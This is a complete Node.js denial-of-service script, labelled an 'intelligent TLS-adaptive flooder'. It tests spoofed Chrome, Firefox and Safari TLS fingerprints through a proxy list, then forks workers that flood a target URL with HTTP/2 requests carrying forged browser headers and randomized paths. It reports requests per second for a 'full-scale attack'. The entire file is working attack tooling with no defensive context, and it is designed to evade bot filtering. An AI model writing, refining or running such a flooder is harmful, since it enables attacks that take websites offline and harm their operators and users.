const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const fs = require("fs");

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;
process.on('uncaughtException', function (exception) {});

if (process.argv.length < 7) {
    console.log(`Usage: node intelligent_tls.js <URL> <TIME> <RATE> <THREADS> <PROXY_FILE>`);
    process.exit();
}
const args = {
    target: process.argv[2],
    time: parseInt(process.argv[3]),
    rate: parseInt(process.argv[4]),
    threads: parseInt(process.argv[5]),
    proxyFile: process.argv[6]
};
const proxies = fs.readFileSync(args.proxyFile, "utf-8").toString().split(/\r?\n/).filter(Boolean);
const parsedTarget = url.parse(args.target);

const TLS_FINGERPRINTS = {
    chrome: {
        name: "Chrome/Win10",
        ciphers: "TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256",
        sigalgs: "ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384",
        userAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        secChUa: '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"'
    },
    firefox: {
        name: "Firefox/Win10",
        ciphers: "TLS_AES_128_GCM_SHA256:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_256_GCM_SHA384",
        sigalgs: "ecdsa_secp256r1_sha256:ecdsa_secp384r1_sha384:ecdsa_secp521r1_sha512:rsa_pss_rsae_sha256",
        userAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
        secChUa: null
    },
    safari: {
        name: "Safari/macOS",
        ciphers: "TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256",
        sigalgs: "ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256",
        userAgent: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
        secChUa: null
    }
};

const randomElement = (arr) => arr[Math.floor(Math.random() * arr.length)];
const randstr = (length) => crypto.randomBytes(length).toString('hex');

function buildHeaders(fingerprint) {
    const headers = {
        ":method": "GET",
        ":authority": parsedTarget.host,
        ":scheme": "https",
        ":path": parsedTarget.path + "?" + randstr(5),
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
        "accept-language": "en-US,en;q=0.9",
        "accept-encoding": "gzip, deflate, br",
        "user-agent": fingerprint.userAgent,
        "upgrade-insecure-requests": "1",
        "sec-fetch-dest": "document",
        "sec-fetch-mode": "navigate",
        "sec-fetch-site": "none",
        "sec-fetch-user": "?1",
        "cache-control": "no-cache",
        "pragma": "no-cache",
    };
    if (fingerprint.secChUa) {
        headers["sec-ch-ua"] = fingerprint.secChUa;
        headers["sec-ch-ua-mobile"] = "?0";
        headers["sec-ch-ua-platform"] = '"Windows"';
    }
    return headers;
}

class NetSocket {
    constructor() {}
    HTTP(options, callback) {
        const proxyAddr = options.address.split(":");
        const connection = net.connect({ host: proxyAddr[0], port: parseInt(proxyAddr[1]), timeout: options.timeout });
        connection.setKeepAlive(true, 60000);
        connection.setNoDelay(true);
        connection.on("connect", () => connection.write(`CONNECT ${options.targetHost}:443 HTTP/1.1\r\nHost: ${options.targetHost}:443\r\n\r\n`));
        connection.on("data", chunk => chunk.toString("utf-8").includes("HTTP/1.1 200") ? callback(connection, null) : (connection.destroy(), callback(null, "error")));
        connection.on("error", () => (connection.destroy(), callback(null, "error")));
        connection.on("timeout", () => (connection.destroy(), callback(null, "error")));
    }
}

const Socker = new NetSocket();

function probeTLS(fingerprint, proxy) {
    return new Promise((resolve) => {
        const proxyOptions = { address: proxy, targetHost: parsedTarget.host, timeout: 3000 };
        Socker.HTTP(proxyOptions, (connection, error) => {
            if (error) return resolve(false);
            const tlsOptions = { secure: true, ALPNProtocols: ['h2'], socket: connection, servername: parsedTarget.host, rejectUnauthorized: false, ciphers: fingerprint.ciphers, sigalgs: fingerprint.sigalgs };
            const tlsConn = tls.connect(tlsOptions);
            tlsConn.on('secureConnect', () => {
                tlsConn.destroy();
                connection.destroy();
                resolve(true);
            });
            tlsConn.on('error', () => {
                tlsConn.destroy();
                connection.destroy();
                resolve(false);
            });
        });
    });
}

function runFlooder(fingerprint) {
    const proxy = randomElement(proxies);
    const proxyOptions = { address: proxy, targetHost: parsedTarget.host, timeout: 5000 };

    Socker.HTTP(proxyOptions, (connection, error) => {
        if (error) return;
        const tlsOptions = { secure: true, ALPNProtocols: ['h2'], socket: connection, servername: parsedTarget.host, rejectUnauthorized: false, ciphers: fingerprint.ciphers, sigalgs: fingerprint.sigalgs };
        const tlsConn = tls.connect(tlsOptions);

        tlsConn.on('secureConnect', () => {
            const client = http2.connect(parsedTarget.href, {
                createConnection: () => tlsConn,
                settings: { maxConcurrentStreams: 20000 }
            });

            client.on("connect", () => {
                const requestInterval = setInterval(() => {
                    for (let i = 0; i < args.rate; i++) {
                        if (client.destroyed) break;
                        const request = client.request(buildHeaders(fingerprint));
                        request.on("response", () => process.send({ success: 1 }));
                        request.on("error", () => process.send({ fail: 1 }));
                        request.end();
                    }
                }, 1000);
                client.on("close", () => clearInterval(requestInterval));
            });
            client.on("close", () => { client.destroy(); connection.destroy(); });
            client.on("error", () => { client.destroy(); connection.destroy(); });
        });
        tlsConn.on('error', () => connection.destroy());
    });
}

async function main() {
    if (cluster.isMaster) {
        console.clear();
        console.log("================================================================================");
        console.log("⚡ INTELLIGENT TLS-ADAPTIVE FLOODER ⚡");
        console.log("================================================================================");
        console.log(`  Target: ${args.target}`);
        console.log(`  Time: ${args.time}s`);
        console.log(`  Threads: ${args.threads}`);
        console.log(`  Rate: ${args.rate} req/conn/s`);
        console.log(`  Proxies: ${proxies.length}`);
        console.log("--------------------------------------------------------------------------------");

        console.log("Phase 1: Probing target with different TLS fingerprints...");
        let bestFingerprintName = 'chrome';
        let maxSuccess = 0;
        for (const key in TLS_FINGERPRINTS) {
            const fingerprint = TLS_FINGERPRINTS[key];
            let successCount = 0;
            const probePromises = [];
            for(let i=0; i < 5; i++) {
                probePromises.push(probeTLS(fingerprint, randomElement(proxies)));
            }
            const results = await Promise.all(probePromises);
            successCount = results.filter(Boolean).length;
            
            console.log(`  - Probing with ${fingerprint.name}... Success rate: ${successCount}/5`);
            if (successCount > maxSuccess) {
                maxSuccess = successCount;
                bestFingerprintName = key;
            }
        }

        if (maxSuccess === 0) {
            console.log("Warning: All TLS probes failed. Defaulting to 'chrome'. Target might be down or proxies are bad.");
        } else {
            console.log(`\nPhase 2: Best fingerprint found: ${TLS_FINGERPRINTS[bestFingerprintName].name}. Launching full-scale attack...`);
        }

        const chosenFingerprint = JSON.stringify(TLS_FINGERPRINTS[bestFingerprintName]);
        for (let i = 0; i < args.threads; i++) {
            cluster.fork({ chosenFingerprint: chosenFingerprint });
        }
        
        let totalSuccess = 0, lastTotal = 0;
        const workers = Object.values(cluster.workers);
        workers.forEach(worker => {
            worker.on('message', (stats) => {
                if (stats.success) totalSuccess += stats.success;
            });
        });

        const statsInterval = setInterval(() => {
            const rps = totalSuccess - lastTotal;
            lastTotal = totalSuccess;
            process.stdout.write(`  RPS: ${rps.toLocaleString()}   |   Total Sent: ${totalSuccess.toLocaleString()}\r`);
        }, 1000);

        setTimeout(() => {
            clearInterval(statsInterval);
            console.log("\n\nAttack Finished.");
            process.exit(0);
        }, args.time * 1000);

    } else {
        const chosenFingerprint = JSON.parse(process.env.chosenFingerprint);
        setInterval(() => runFlooder(chosenFingerprint));
        setTimeout(() => process.exit(0), args.time * 1000);
    }
}

main();